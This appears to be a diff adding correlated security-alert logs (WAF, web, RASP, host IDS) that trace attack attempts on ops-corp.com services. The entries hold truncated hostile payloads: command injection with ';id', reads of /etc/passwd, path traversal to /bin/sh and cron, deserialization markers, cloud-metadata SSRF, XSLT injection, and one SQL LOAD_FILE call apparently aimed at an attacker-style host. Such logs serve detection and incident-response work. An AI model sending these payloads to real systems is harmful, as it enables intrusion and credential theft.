@@ -1,0 +1,89 @@
+1. `2026-05-08 10:21:48` **[waf]** `WAF0051137`
+    `/api/v1/ping?cmd=127.0.0.1;id cmd=127.0.0.1;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K`
+2. `2026-05-08 10:21:49` **[web]** `WEB0051542`
+    `/api/v1/ping?cmd=127.0.0.1;id cmd=127.0.0.1;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (K`
+3. `2026-05-08 10:21:50` **[rasp]** `RASP0056345`
+    `https://app-go-194.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 1`
+4. `2026-05-08 10:22:48` **[hids]** `HID0054017`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /usr/local/bin/app-server`
+
+1. `2026-05-08 17:31:49` **[waf]** `WAF0053241`
+    `/api/v1/namespaces/default/endpoints SELECT load_file('/etc/passwd') Mozilla/5.0 (Windows NT 10.0; Win64; x64;`
+2. `2026-05-08 17:31:50` **[web]** `WEB0053620`
+    `/api/v1/namespaces/default/endpoints SELECT load_file('/etc/passwd') Mozilla/5.0 (Windows NT 10.0; Win64; x64;`
+3. `2026-05-08 17:31:51` **[rasp]** `RASP0058670`
+    `https://app-django-199.ops-corp.com/api/v1/namespaces/default/endpoints {"cmd_inject": ";id", "cmd": "loginNam`
+4. `2026-05-08 17:32:49` **[hids]** `HID0055837`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /opt/app/main`
+
+1. `2026-05-12 04:21:36` **[waf]** `WAF0077288`
+    `/stream echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.`
+2. `2026-05-12 04:21:37` **[web]** `WEB0077806`
+    `/stream echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.`
+3. `2026-05-12 04:21:38` **[rasp]** `RASP0085134`
+    `https://app-nginx-98.ops-corp.com/stream {"php_fpm_rce": true, "cmd": "echo;id"} Mozilla/5.0 (Windows NT 10.0;`
+4. `2026-05-12 04:22:36` **[hids]** `HID0081446`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== nginx: worker process`
+
+1. `2026-05-14 05:19:22` **[waf]** `WAF0091531`
+    `/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= filename=../../../etc/cron.d/5d4d036 Mozilla/5`
+2. `2026-05-14 05:19:23` **[web]** `WEB0092181`
+    `/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= filename=../../../etc/cron.d/5d4d036 Mozilla/5`
+3. `2026-05-14 05:19:24` **[rasp]** `RASP0100914`
+    `https://app-java-177.ops-corp.com/webtools/control/main?deserialization=rO0ABXNyABFqYXZhLnV0aWw= {"deserializa`
+4. `2026-05-14 05:20:22` **[hids]** `HID0097947`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/bin/java -jar /opt/app/app.`
+
+1. `2026-05-14 08:06:42` **[waf]** `WAF0092361`
+    `/api/v1/ping?cmd=127.0.0.1;id {"username":"user_17f0","password":"17f057df","role":"admin","is_admin":true} Mo`
+2. `2026-05-14 08:06:43` **[web]** `WEB0093009`
+    `/api/v1/ping?cmd=127.0.0.1;id {"username":"user_17f0","password":"17f057df","role":"admin","is_admin":true} Mo`
+3. `2026-05-14 08:06:44` **[rasp]** `RASP0101792`
+    `https://app-go-64.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 10`
+4. `2026-05-14 08:07:42` **[hids]** `HID0098667`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /opt/app/main`
+
+1. `2026-05-14 22:22:58` **[waf]** `WAF0096589`
+    `/api/session?deserialization=rO0ABXNyABFqYXZhLnV0aWw= url=http://metadata.google.internal/computeMetadata/v1/i`
+2. `2026-05-14 22:22:59` **[web]** `WEB0097149`
+    `/api/session?deserialization=rO0ABXNyABFqYXZhLnV0aWw= url=http://metadata.google.internal/computeMetadata/v1/i`
+3. `2026-05-14 22:23:00` **[rasp]** `RASP0106388`
+    `https://app-tomcat-67.ops-corp.com/api/session?deserialization=rO0ABXNyABFqYXZhLnV0aWw= {"deserialization": "r`
+4. `2026-05-14 22:23:58` **[hids]** `HID0102429`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== /usr/local/tomcat/bin/catalina.s`
+
+1. `2026-05-15 10:38:07` **[waf]** `WAF0100053`
+    `/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id <xsl:stylesheet><xsl:template match="/"><xsl:value-of select="document('`
+2. `2026-05-15 10:38:08` **[web]** `WEB0100690`
+    `/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id <xsl:stylesheet><xsl:template match="/"><xsl:value-of select="document('`
+3. `2026-05-15 10:38:09` **[rasp]** `RASP0110197`
+    `https://app-php-77.ops-corp.com/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id {"cmd": "echo;id"} Mozilla/5.0 (Macintosh`
+4. `2026-05-15 10:39:07` **[hids]** `HID0106572`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== php-fpm: pool www`
+
+1. `2026-05-15 14:00:08` **[waf]** `WAF0101035`
+    `/cgi-bin/%%32%65%%32%65/bin/sh echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li`
+2. `2026-05-15 14:00:09` **[web]** `WEB0101661`
+    `/cgi-bin/%%32%65%%32%65/bin/sh echo;id Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li`
+3. `2026-05-15 14:00:10` **[rasp]** `RASP0111254`
+    `https://app-php-160.ops-corp.com/cgi-bin/%%32%65%%32%65/bin/sh {"cmd": "echo;id"} Mozilla/5.0 (Windows NT 10.0`
+4. `2026-05-15 14:01:08` **[hids]** `HID0107495`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/bash -c 'cat /etc/passwd' <== /usr/sbin/apache2`
+
+1. `2026-05-17 04:44:01` **[waf]** `WAF0112011`
+    `/api/users?mass_assignment={"admin":true} id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e,0x6576696c2e636f`
+2. `2026-05-17 04:44:02` **[web]** `WEB0112966`
+    `/api/users?mass_assignment={"admin":true} id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,version(),0x2e,0x6576696c2e636f`
+3. `2026-05-17 04:44:03` **[rasp]** `RASP0123647`
+    `https://app-rails-88.ops-corp.com/api/users?mass_assignment={"admin":true} {"mass_assignment": "{\"admin\":tru`
+4. `2026-05-17 04:45:01` **[hids]** `HID0122499`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/sh -c 'cat /etc/passwd' <== bundle exec rails server -b 0.0.`
+
+1. `2026-05-17 18:26:43` **[waf]** `WAF0115976`
+    `/api/v1/ping?cmd=127.0.0.1;id rememberMe=<base64_serialized_payload> Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+2. `2026-05-17 18:26:44` **[web]** `WEB0116905`
+    `/api/v1/ping?cmd=127.0.0.1;id rememberMe=<base64_serialized_payload> Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+3. `2026-05-17 18:26:45` **[rasp]** `RASP0127960`
+    `https://app-go-183.ops-corp.com/api/v1/ping?cmd=127.0.0.1;id {"cmd": "127.0.0.1;id"} Mozilla/5.0 (Windows NT 1`
+4. `2026-05-17 18:27:43` **[hids]** `HID0126339`
+    `cat /etc/passwd /bin/cat cat /etc/passwd <== /bin/dash -c 'cat /etc/passwd' <== /usr/local/bin/app-server`
